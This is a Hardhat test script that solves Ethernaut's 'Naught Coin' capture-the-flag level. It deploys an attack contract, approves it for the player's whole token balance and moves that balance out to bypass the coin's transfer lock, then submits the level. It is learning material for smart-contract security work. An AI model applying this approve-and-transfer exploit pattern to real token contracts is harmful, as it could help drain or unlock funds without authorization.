import {ethers} from 'hardhat'
import {BigNumber, Contract, providers, Signer} from 'ethers'

import {ETHERNAUT_ADDRESS, expect, expectStatusOK} from './testUtil'

const LEVEL_ADDRESS = '0x096bb5e93a204BfD701502EB6EF266a950217218'
const INSTANCE_ADDRESS = '0x69B4F5efF3612d657B2FF87F7dd54Febe90143cd'

describe('15 Naught Coin', () => {
  let ethernaut: Contract
  let instance: Contract
  let attack: Contract
  let signer: Signer
  let signerAddress: string
  let provider: providers.Provider

  let playerBalance: BigNumber

  before(async () => {
    ethernaut = await ethers.getContractAt('Ethernaut', ETHERNAUT_ADDRESS)
    instance = await ethers.getContractAt('NaughtCoin', INSTANCE_ADDRESS)

    const signers = await ethers.getSigners()
    signer = signers[0]
    signerAddress = await signer.getAddress()
    provider = signer.provider!
  })

  it('deploys attack contract and approves it for transfer', async () => {
      const factory = await ethers.getContractFactory('NaughtCoinAttack')
      attack = await factory.deploy(instance.address)
      await attack.deployTransaction.wait()

      playerBalance = await instance.balanceOf(signerAddress)

      await expect(instance.approve(attack.address, playerBalance)).to.emit(instance, 'Approval')
  })

  it('lets attack contract transfer player balance to itself', async () => {
      const tx = await attack.transferPlayerBalance()
      return expectStatusOK(tx)
  })

  it('verifies player has zero balance', async () => {
      expect(await instance.balanceOf(signerAddress)).to.eq(0)
  })

  it('is validated', async () => {
    return expect(ethernaut.submitLevelInstance(instance.address, {gasLimit:100000}))
      .to.emit(ethernaut, 'LevelCompletedLog')
      .withArgs(signerAddress, LEVEL_ADDRESS).eventually
  })
})
